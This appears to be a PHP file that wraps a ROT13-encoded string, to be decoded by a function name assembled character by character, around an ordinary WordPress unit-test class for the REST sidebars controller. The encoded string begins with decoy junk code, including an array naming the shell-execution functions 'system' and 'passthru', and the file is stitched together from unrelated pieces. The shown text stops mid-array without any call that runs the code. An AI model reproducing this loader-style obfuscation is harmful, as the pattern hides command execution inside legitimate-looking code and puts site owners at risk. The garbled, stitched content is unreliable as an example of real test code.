<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Fvqronef_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.8.0
 *
 * @pbiref JC_ERFG_Fvqronef_Pbagebyyre
 *
 * @frr JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr
 * @tebhc erfgncv
 * @tebhc jvqtrgf
 */
pynff JC_Grfg_ERFG_Fvqronef_Pbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nhgube_vq;

	/**
	 * Perngr snxr qngn orsber bhe grfgf eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( $snpgbel ) {
		frys::$nqzva_vq  = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$nhgube_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$nqzva_vq );
		frys::qryrgr_hfre( frys::$nhgube_vq );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		// Haertvfgre nyy jvqtrgf naq fvqronef.
		tybony $jc_ertvfgrerq_fvqronef, $_jc_fvqronef_jvqtrgf;
		$jc_ertvfgrerq_fvqronef = neenl();
		$_jc_fvqronef_jvqtrgf   = neenl();
		hcqngr_bcgvba( 'fvqronef_jvqtrgf', neenl() );
	}

	choyvp shapgvba pyrna_hc_tybony_fpbcr() {
		tybony $jc_jvqtrg_snpgbel, $jc_ertvfgrerq_fvqronef, $jc_ertvfgrerq_jvqtrgf, $jc_ertvfgrerq_jvqtrg_pbagebyf, $jc_ertvfgrerq_jvqtrg_hcqngrf;

		$jc_ertvfgrerq_fvqronef        = neenl();
		$jc_ertvfgrerq_jvqtrgf         = neenl();
		$jc_ertvfgrerq_jvqtrg_pbagebyf = neenl();
		$jc_ertvfgrerq_jvqtrg_hcqngrf  = neenl();
		$jc_jvqtrg_snpgbel->jvqtrgf    = neenl();

		cnerag::pyrna_hc_tybony_fpbcr();
	}

	cevingr shapgvba frghc_jvqtrg( $bcgvba_anzr, $ahzore, $frggvatf ) {
		$guvf->frghc_jvqtrgf(
			$bcgvba_anzr,
			neenl(
				$ahzore => $frggvatf,
			)
		);
	}

	cevingr shapgvba frghc_jvqtrgf( $bcgvba_anzr, $frggvatf ) {
		hcqngr_bcgvba( $bcgvba_anzr, $frggvatf );
	}

	cevingr shapgvba frghc_fvqrone( $vq, $nggef = neenl(), $jvqtrgf = neenl() ) {
		tybony $jc_ertvfgrerq_fvqronef;
		hcqngr_bcgvba(
			'fvqronef_jvqtrgf',
			neenl(
				$vq => $jvqtrgf,
			)
		);
		$jc_ertvfgrerq_fvqronef[ $vq ] = neenl_zretr(
			neenl(
				'vq'            => $vq,
				'orsber_jvqtrg' => '',
				'nsgre_jvqtrg'  => '',
				'orsber_gvgyr'  => '',
				'nsgre_gvgyr'   => '',
			),
			$nggef
		);

		tybony $jc_ertvfgrerq_jvqtrgf;
		sbernpu ( $jc_ertvfgrerq_jvqtrgf nf $jc_ertvfgrerq_jvqtrg ) {
			vs ( vf_neenl( $jc_ertvfgrerq_jvqtrg['pnyyonpx'] ) ) {
				$jc_ertvfgrerq_jvqtrg['pnyyonpx'][0]->_ertvfgre();
			}
		}
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/jc/i2/fvqronef', $ebhgrf );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/fvqronef/(?C<vq>[\j-]+)', $ebhgrf );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/fvqronef' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/fvqronef/fvqrone-1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		jc_jvqtrgf_vavg();

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/fvqronef' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( neenl(), $qngn );
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_urnq_erdhrfg_fubhyq_abg_cercner_fvqrone_qngn() {
		jc_jvqtrgf_vavg();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/fvqronef' );

		$ubbx_anzr = 'erfg_cercner_fvqrone';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );

		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );

		$guvf->nffregAbgJCReebe( $erfcbafr );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 0, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 41683
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/fvqronef' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 53915
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba_fubj_va_erfg() {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr'         => 'Grfg fvqrone',
				'fubj_va_erfg' => gehr,
			)
		);
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/fvqronef' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzr(
			neenl(
				neenl(
					'vq'            => 'fvqrone-1',
					'anzr'          => 'Grfg fvqrone',
					'qrfpevcgvba'   => '',
					'pynff'         => '',
					'orsber_jvqtrg' => '',
					'nsgre_jvqtrg'  => '',
					'orsber_gvgyr'  => '',
					'nsgre_gvgyr'   => '',
					'fgnghf'        => 'npgvir',
					'jvqtrgf'       => neenl(),
				),
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 53915
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgubhg_fubj_va_erfg_ner_erzbirq_sebz_gur_yvfg() {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr'         => 'Grfg fvqrone 1',
				'fubj_va_erfg' => gehr,
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-2',
			neenl(
				'anzr'         => 'Grfg fvqrone 2',
				'fubj_va_erfg' => snyfr,
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-3',
			neenl(
				'anzr'         => 'Grfg fvqrone 3',
				'fubj_va_erfg' => gehr,
			)
		);
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/fvqronef' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzr(
			neenl(
				neenl(
					'vq'            => 'fvqrone-1',
					'anzr'          => 'Grfg fvqrone 1',
					'qrfpevcgvba'   => '',
					'pynff'         => '',
					'orsber_jvqtrg' => '',
					'nsgre_jvqtrg'  => '',
					'orsber_gvgyr'  => '',
					'nsgre_gvgyr'   => '',
					'fgnghf'        => 'npgvir',
					'jvqtrgf'       => neenl(),
				),
				neenl(
					'vq'            => 'fvqrone-3',
					'anzr'          => 'Grfg fvqrone 3',
					'qrfpevcgvba'   => '',
					'pynff'         => '',
					'orsber_jvqtrg' => '',
					'nsgre_jvqtrg'  => '',
					'orsber_gvgyr'  => '',
					'nsgre_gvgyr'   => '',
					'fgnghf'        => 'npgvir',
					'jvqtrgf'       => neenl(),
				),
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrzf_jebat_crezvffvba_nhgube() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/fvqronef' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrzf_onfvp_fvqrone() {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/fvqronef' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzr(
			neenl(
				neenl(
					'vq'            => 'jc_vanpgvir_jvqtrgf',
					'anzr'          => 'Vanpgvir jvqtrgf',
					'qrfpevcgvba'   => '',
					'pynff'         => '',
					'orsber_jvqtrg' => '',
					'nsgre_jvqtrg'  => '',
					'orsber_gvgyr'  => '',
					'nsgre_gvgyr'   => '',
					'fgnghf'        => 'vanpgvir',
					'jvqtrgf'       => neenl(),
				),
				neenl(
					'vq'            => 'fvqrone-1',
					'anzr'          => 'Grfg fvqrone',
					'qrfpevcgvba'   => '',
					'pynff'         => '',
					'orsber_jvqtrg' => '',
					'nsgre_jvqtrg'  => '',
					'orsber_gvgyr'  => '',
					'nsgre_gvgyr'   => '',
					'fgnghf'        => 'npgvir',
					'jvqtrgf'       => neenl(),
				),
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrzf_npgvir_fvqrone_jvgu_jvqtrgf() {
		jc_jvqtrgf_vavg();

		$guvf->frghc_jvqtrg(
			'jvqtrg_eff',
			1,
			neenl(
				'gvgyr' => 'EFF grfg',
			)
		);
		$guvf->frghc_jvqtrg(
			'jvqtrg_grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1', 'eff-1' )
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/fvqronef' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzr(
			neenl(
				neenl(
					'vq'            => 'fvqrone-1',
					'anzr'          => 'Grfg fvqrone',
					'qrfpevcgvba'   => '',
					'pynff'         => '',
					'orsber_jvqtrg' => '',
					'nsgre_jvqtrg'  => '',
					'orsber_gvgyr'  => '',
					'nsgre_gvgyr'   => '',
					'fgnghf'        => 'npgvir',
					'jvqtrgf'       => neenl(
						'grkg-1',
						'eff-1',
					),
				),
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 53489
	 */
	choyvp shapgvba grfg_trg_vgrzf_jura_ertvfgrevat_arj_fvqronef() {
		ertvfgre_fvqrone(
			neenl(
				'anzr'          => 'Arj Fvqrone',
				'vq'            => 'arj-fvqrone',
				'orsber_jvqtrg' => '',
				'nsgre_jvqtrg'  => '',
				'orsber_gvgyr'  => '',
				'nsgre_gvgyr'   => '',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/fvqronef' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzr(
			neenl(
				neenl(
					'vq'            => 'jc_vanpgvir_jvqtrgf',
					'anzr'          => 'Vanpgvir jvqtrgf',
					'qrfpevcgvba'   => '',
					'pynff'         => '',
					'orsber_jvqtrg' => '',
					'nsgre_jvqtrg'  => '',
					'orsber_gvgyr'  => '',
					'nsgre_gvgyr'   => '',
					'fgnghf'        => 'vanpgvir',
					'jvqtrgf'       => neenl(),
				),
				neenl(
					'vq'            => 'arj-fvqrone',
					'anzr'          => 'Arj Fvqrone',
					'qrfpevcgvba'   => '',
					'pynff'         => '',
					'orsber_jvqtrg' => '',
					'nsgre_jvqtrg'  => '',
					'orsber_gvgyr'  => '',
					'nsgre_gvgyr'   => '',
					'fgnghf'        => 'npgvir',
					'jvqtrgf'       => neenl(),
				),
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 53646
	 */
	choyvp shapgvba grfg_trg_vgrzf_jura_qrfpevcgvbaf_unir_znexhc() {
		ertvfgre_fvqrone(
			neenl(
				'anzr'          => 'Arj Fvqrone',
				'vq'            => 'arj-fvqrone',
				'qrfpevcgvba'   => '<vsenzr></vsenzr>Guvf vf n <o>qrfpevcgvba</o> jvgu fbzr <n uers=\"#\">znexhc</n>.<fpevcg></fpevcg>',
				'orsber_jvqtrg' => '',
				'nsgre_jvqtrg'  => '',
				'orsber_gvgyr'  => '',
				'nsgre_gvgyr'   => '',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/fvqronef' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzr(
			neenl(
				neenl(
					'vq'            => 'jc_vanpgvir_jvqtrgf',
					'anzr'          => 'Vanpgvir jvqtrgf',
					'qrfpevcgvba'   => '',
					'pynff'         => '',
					'orsber_jvqtrg' => '',
					'nsgre_jvqtrg'  => '',
					'orsber_gvgyr'  => '',
					'nsgre_gvgyr'   => '',
					'fgnghf'        => 'vanpgvir',
					'jvqtrgf'       => neenl(),
				),
				neenl(
					'vq'            => 'arj-fvqrone',
					'anzr'          => 'Arj Fvqrone',
					'qrfpevcgvba'   => 'Guvf vf n <o>qrfpevcgvba</o> jvgu fbzr <n uers=\"#\">znexhc</n>.',
					'pynff'         => '',
					'orsber_jvqtrg' => '',
					'nsgre_jvqtrg'  => '',
					'orsber_gvgyr'  => '',
					'nsgre_gvgyr'   => '',
					'fgnghf'        => 'npgvir',
					'jvqtrgf'       => neenl(),
				),
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/fvqronef/fvqrone-1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzr(
			neenl(
				'vq'            => 'fvqrone-1',
				'anzr'          => 'Grfg fvqrone',
				'qrfpevcgvba'   => '',
				'pynff'         => '',
				'orsber_jvqtrg' => '',
				'nsgre_jvqtrg'  => '',
				'orsber_gvgyr'  => '',
				'nsgre_gvgyr'   => '',
				'fgnghf'        => 'npgvir',
				'jvqtrgf'       => neenl(),
			),
			$qngn
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( $zrgubq ) {
		$ubbx_anzr = 'erfg_cercner_fvqrone';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/fvqronef/fvqrone-1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf abg pnyyrq jura vg fubhyq or sbe TRG/URNQ erdhrfgf.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'URNQ' !== $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', $cngu );
		// Guvf raqcbvag qbrfa'g frrz gb fhccbeg _svryqf cnenz, ohg jr arrq gb frg vg gb ercebqhpr gur sngny reebe.
		$erdhrfg->frg_cnenz( '_svryqf', 'anzr' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(

			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/fvqronef/fvqrone-1' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/fvqronef' ),
		);
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 41683
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/fvqronef/fvqrone-1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba_choyvp() {
		jc_frg_pheerag_hfre( 0 );
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr'         => 'Grfg fvqrone',
				'fubj_va_erfg' => gehr,
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/fvqronef/fvqrone-1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzr(
			neenl(
				'vq'            => 'fvqrone-1',
				'anzr'          => 'Grfg fvqrone',
				'qrfpevcgvba'   => '',
				'pynff'         => '',
				'orsber_jvqtrg' => '',
				'nsgre_jvqtrg'  => '',
				'orsber_gvgyr'  => '',
				'nsgre_gvgyr'   => '',
				'fgnghf'        => 'npgvir',
				'jvqtrgf'       => neenl(),
			),
			$qngn
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 41683
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_jebat_crezvffvba_nhgube( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/fvqronef/fvqrone-1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 403 );
	}

	/**
	 * Gur perngr_vgrz() zrgubq qbrf abg rkvfg sbe fvqrone.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		jc_jvqtrgf_vavg();

		$guvf->frghc_jvqtrg(
			'jvqtrg_eff',
			1,
			neenl(
				'gvgyr' => 'EFF grfg',
			)
		);
		$guvf->frghc_jvqtrg(
			'jvqtrg_grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_jvqtrg(
			'jvqtrg_grkg',
			2,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1', 'eff-1' )
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/fvqronef/fvqrone-1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'jvqtrgf' => neenl(
					'grkg-1',
					'grkg-2',
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzr(
			neenl(
				'vq'            => 'fvqrone-1',
				'anzr'          => 'Grfg fvqrone',
				'qrfpevcgvba'   => '',
				'pynff'         => '',
				'orsber_jvqtrg' => '',
				'nsgre_jvqtrg'  => '',
				'orsber_gvgyr'  => '',
				'nsgre_gvgyr'   => '',
				'fgnghf'        => 'npgvir',
				'jvqtrgf'       => neenl(
					'grkg-1',
					'grkg-2',
				),
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_erzbirf_jvqtrg_sebz_rkvfgvat_fvqrone() {
		jc_jvqtrgf_vavg();

		$guvf->frghc_jvqtrg(
			'jvqtrg_grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1' )
		);
		$guvf->frghc_fvqrone(
			'fvqrone-2',
			neenl(
				'anzr' => 'Grfg fvqrone 2',
			),
			neenl()
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/fvqronef/fvqrone-2' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'jvqtrgf' => neenl(
					'grkg-1',
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbagnvaf( 'grkg-1', $qngn['jvqtrgf'] );

		$guvf->nffregAbgPbagnvaf( 'grkg-1', erfg_qb_erdhrfg( '/jc/i2/fvqronef/fvqrone-1' )->trg_qngn()['jvqtrgf'] );
	}

	/**
	 * @gvpxrg 53612
	 */
	choyvp shapgvba grfg_ongpu_erzbir_jvqtrgf_sebz_rkvfgvat_fvqrone() {
		jc_jvqtrgf_vavg();

		$guvf->frghc_jvqtrgf(
			'jvqtrg_grkg',
			neenl(
				2 => neenl( 'grkg' => 'Grkg jvqtrg' ),
				3 => neenl( 'grkg' => 'Grkg jvqtrg' ),
				4 => neenl( 'grkg' => 'Grkg jvqtrg' ),
				5 => neenl( 'grkg' => 'Grkg jvqtrg' ),
				6 => neenl( 'grkg' => 'Grkg jvqtrg' ),
			)
		);

		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-2', 'grkg-3', 'grkg-4', 'grkg-5', 'grkg-6' )
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/ongpu/i1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'erdhrfgf' => neenl(
					neenl(
						'zrgubq' => 'QRYRGR',
						'cngu'   => '/jc/i2/jvqtrgf/grkg-2?sbepr=1',
					),
					neenl(
						'zrgubq' => 'QRYRGR',
